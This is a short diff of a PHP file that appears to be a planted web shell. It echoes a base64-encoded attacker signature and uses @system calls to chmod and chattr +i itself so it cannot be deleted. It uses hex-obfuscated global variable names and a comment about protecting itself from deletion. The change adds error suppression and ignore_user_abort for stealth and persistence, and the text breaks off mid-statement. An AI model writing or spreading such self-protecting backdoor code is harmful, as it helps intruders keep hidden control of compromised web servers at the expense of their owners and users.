@@ -13,15 +13,16 @@
     */
 
 # attempt to protect myself from deletion
-http_response_code(200);
-http_response_code(200);
+
 $str = "c2VjdXJpdHkwMDctTXIuY2FraWw=";
 echo base64_decode($str);
 ?><?;?>;
 <?php
 // Mengatur kode respons HTTP
-http_response_code(200);
-http_response_code(200);
+error_reporting(0);
+ob_start("ob_gzhandler");
+ignore_user_abort(true);
+ini_set("memory_limit", "-1");
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 ${"\x47L\x4f\x42\x41L\x53"}["\x6a\x66rn\x6f\x71h\x6c"] =
